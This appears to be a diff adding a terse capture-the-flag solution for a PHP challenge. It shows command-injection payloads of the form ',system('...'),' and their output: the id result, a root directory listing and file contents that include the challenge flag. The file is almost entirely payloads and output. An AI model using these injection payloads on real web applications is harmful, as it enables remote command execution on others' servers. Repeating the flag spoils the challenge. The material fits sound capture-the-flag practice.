@@ -1,0 +1,79 @@
+',system  ('id' ),'
+```
+Hello uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+',system  ('ls /' ),'
+```
+Hello FLlA4agGgg999gg
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+var
+```
+
+',system  ('head /*' ),'
+```
+Hello ==> /FLlA4agGgg999gg <==
+flaggege.php
+flagxxx.txt
+flagfake5
+flagfake4
+flagfake3
+flagfake2
+flagfake1
+zh3r0{W4RmUp_4_Fun_13333333337}
+flagfake6
+==> /bin <==
+
+==> /boot <==
+
+==> /dev <==
+
+==> /etc <==
+
+==> /home <==
+
+==> /lib <==
+
+==> /lib64 <==
+
+==> /media <==
+
+==> /mnt <==
+
+==> /opt <==
+
+==> /proc <==
+
+==> /run <==
+
+==> /sbin <==
+
+==> /srv <==
+
+==> /sys <==
+
+==> /tmp <==
+
+==> /usr <==
+
+==> /var <==
+==> /var <==<
+```
